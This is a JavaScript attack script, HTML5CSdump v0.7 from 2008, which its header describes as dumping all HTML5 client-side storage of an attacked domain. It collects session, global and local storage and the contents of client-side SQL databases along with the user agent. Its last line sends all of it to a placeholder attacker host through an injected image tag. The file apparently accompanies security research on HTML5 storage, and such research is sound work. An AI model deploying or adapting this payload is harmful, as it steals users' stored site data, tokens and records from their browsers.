/*/
 * HTML5CSdump v0.7 - October 2008
 * 
 * This JavaScript code will dump in an automated fashion ALL the content of the
 * HTML 5 Client-side Storage technology of the attacked domain.
 *
 * Download the last version at: http://trivero.secdiscover.com/html5csdump.js
 * Related white paper: http://trivero.secdiscover.com/html5whitepaper.pdf
 *
 * Coded by Alberto 'ameft' Trivero - a.trivero(*)secdiscover.com
/*/

var dump_ss = "";
var dump_gs = "";
var dump_ls = "";
var dump_db = "";
var storage_support = "";
var ua = navigator.userAgent + "%0D%0A";

if("sessionStorage" in window) {
	if(storage_support) { storage_support += "%2C%20"}
	storage_support += "Session%20Storage";
	for(i = 0; i < sessionStorage.length; i++) {
		dump_ss += "window%2EsessionStorage%2E" + sessionStorage.key(i) + "%20%3D%20" + sessionStorage.getItem(sessionStorage.key(i)) + "%0D%0A";
	}
}

if("globalStorage" in window) {
	if(storage_support) { storage_support += "%2C%20"}
	storage_support += "Global%20Storage";
	for(i = 0; i < globalStorage[location.hostname].length; i++) {
		dump_gs += "window%2EglobalStorage%5B%27" + location.hostname + "%27%5D%2E" + globalStorage[location.hostname].key(i) +
				   "%20%3D%20" + globalStorage[location.hostname].getItem(globalStorage[location.hostname].key(i)) + "%0D%0A";
	}
}

if("localStorage" in window) {
	if(storage_support) { storage_support += "%2C%20"}
	storage_support += "Local%20Storage";
	for(i = 0; i < localStorage.length; i++) {
		dump_ls += "window%2ElocalStorage%2E" + localStorage.key(i) + "%20%3D%20" + localStorage.getItem(localStorage.key(i)) + "%0D%0A";
	}
}

if("openDatabase" in window) {
	if(storage_support) { storage_support += "%2C%20"}
	storage_support += "Database%20Storage";
	for(var j in window) {
		if(window[j] == "[object Database]") {
			dump_db += "Database%20object%3A%20window%2E" + j + "%0D%0A";
			var sql = window[j];
			sql.transaction(function (tx) {
				tx.executeSql("SELECT name FROM sqlite_master WHERE type='table'", [], function(tx, result) {
					for(i = 0; i < result.rows.length; i++) {
						var row = result.rows.item(i);
						if(row['name'] != "__WebKitDatabaseInfoTable__") { // inaccessible table created by WebKit
							dump_db += "Table%20name%3A%20" + row['name'] + "%0D%0A";
							sql.transaction(function (ty) {
								ty.executeSql("SELECT sql FROM sqlite_master WHERE name=?", [row['name']], function(ty, result2) {
									var dbSchema = result2.rows.item(0)['sql'];
									var columns = dbSchema.match(/.*CREATE\s+TABLE\s+(\S+)\s+\((.*)\).*/)[2].split(/\s+[^,]+,?\s*/);
									columns.splice(columns.length - 1); // remove the last element of 'columns': is null
									dump_db += "Database%20schema%3A%0D%0A" + columns.join("%09") + "%0D%0A%09%09%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%0D%0A";
									sql.transaction(function (tz) {
										tz.executeSql("SELECT * FROM " + row['name'], [], function(tz, result3) { // you can't use the ? placeholder to specify the table name
											for(i = 0; i < result3.rows.length; i++) {
												for(k = 0; k < columns.length; k++) {
													dump_db += result3.rows.item(i)[columns[k]] + "%09";
												}
												dump_db += "%0D%0A";
											}
										});
									});
								});
							});
						}
					}
				});
			});
			dump_db += "%0D%0A";
		}
	}
}

alert(dump_db); // to be resolved!

var dump_res = "User%20Agent%3A%20" + ua +
			   "HTML%205%20Structured%20Clien%2Dside%20Storage%20Support%3A%20" + storage_support +
			   "%0D%0A%0D%0A%09%3D%20SESSION%20STORAGE%20%3D%0D%0A%0D%0A" + dump_ss +
			   "%0D%0A%0D%0A%09%3D%20GLOBAL%20STORAGE%20%3D%0D%0A%0D%0A" + dump_gs +
			   "%0D%0A%0D%0A%09%3D%20LOCAL%20STORAGE%20%3D%0D%0A%0D%0A" + dump_ls +
			   "%0D%0A%0D%0A%09%3D%20DATABASE%20STORAGE%20%3D%0D%0A%0D%0A" + dump_db;

document.write('<img src="http://ATTACKER_DOMAIN/evil.php?name=' + dump_res + '">');